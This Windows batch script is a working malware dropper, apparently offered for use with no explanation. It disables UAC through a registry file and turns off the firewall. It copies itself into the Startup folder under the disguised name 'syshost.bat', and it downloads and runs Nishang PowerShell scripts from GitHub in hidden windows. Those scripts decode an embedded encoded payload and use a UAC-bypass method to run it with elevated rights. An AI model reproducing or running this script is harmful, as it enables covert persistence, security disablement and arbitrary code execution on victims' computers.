echo Windows Registry Editor Version 5.00>%Temp%\lua.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]>>%Temp%\lua.reg
echo "EnableLUA"=dword:00000000>>%Temp%\lua.reg


echo copy "%Temp%\render.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\syshost.bat">>%Temp%\render.bat
echo regedit /s lua.reg>%Temp%\render.bat
echo netsh advfirewall set allprofiles state off>>%Temp%\render.bat

echo cd "C:\Windows\System32\WindowsPowerShell\v1.0">>%Temp%\render.bat

echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Invoke-Decode.ps1');Invoke-Decode xVJRa9swEH6Owf9BdIUmDMtxC6PJ2MNos+JBU1NnZLDsQZGvthpbCtIlXrL2v+9sp1s3CnvbXny+7z6dvvt08eQz60+hDm6W9yCRpTuHUPEpIJ/DUpYKNA74pal1aUSWolU6758UiGs3DkMrap4rLDbLjQMrjUaic2mq0InKChSuMKtQK1cInYeVoN42/ISqVLgL32dZkIB1ilAtga9ddDLwvT9gFqTSqjUmAgt2MV7Mlc5M7Rad0LPTJyAxNdi0gLJcbCM+XERNP9/zvWOH9oMqYSoqeHckx4v60GG/39+bJS9NfuR78R3rz8Bh0N7z/Mzgu+/1XrEwZA3C4BsJcwT53uOkdPB7NTPgmDbY0agU/3t/r2gCCrHemhUE16pSK4H7+aXKab7mptyK7Kfdvb/wiHEFGHw0S/bAbkGC2sIhu9lg0E79oqnkT2P/vCBGP2pdnNkda2LPobAYELFL/4dL7aq4J5d+bc9Mrjtr3nbKXqiz4Ba2tKG0m3FC62rBORaNTnn05pxHQz4aMTpgkZ0PR6Omy2PzyaGb+IHVQrW/hDaVC4Gy6IyYW4UQTKw1lh234cvwK5+Zw8QD9voZ3EiTApXRsb4zPDFONck1qRE5HJqnrdNpCUCyUyBzMsfODm/zAw== -IsString -OutputFilePath 1.ps1" >>%Temp%\render.bat

echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden 1.ps1 >>%Temp%\render.bat


C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1');Invoke-PsUACme -method oobe -Payload \"%Temp%\\render.bat\""